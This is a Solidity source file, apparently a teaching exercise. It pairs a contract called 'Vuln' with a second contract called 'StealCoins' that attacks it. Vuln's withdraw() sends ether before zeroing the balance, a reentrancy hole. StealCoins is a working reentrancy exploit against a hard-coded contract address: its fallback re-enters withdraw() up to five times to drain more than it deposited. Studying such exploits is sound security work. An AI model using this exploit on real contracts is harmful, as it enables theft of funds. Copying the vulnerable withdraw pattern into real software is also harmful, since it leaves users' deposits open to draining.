pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract StealCoins {
    
    uint16 withdrawCount;
    Vuln vulnAddress = Vuln(0x649A4bd91068077e1D7C9Ddf389a445234801794);
    
    //write a function to actually deposit
    function start() public payable {
        withdrawCount = 0;
        require(msg.value <= .1 ether);
        vulnAddress.deposit.value(msg.value)();
        vulnAddress.withdraw();
    }
    
    //write a call back
    //this gets called by withdraw
    //call withdraw again
    //this gets called by withdraw 
    //.. repeat
    // withdraw finally sets my balance to 0 after sending me more money than i put in
    function () external payable {
        if (withdrawCount < 5){
            withdrawCount += 1;
            vulnAddress.withdraw();
        }
    }
}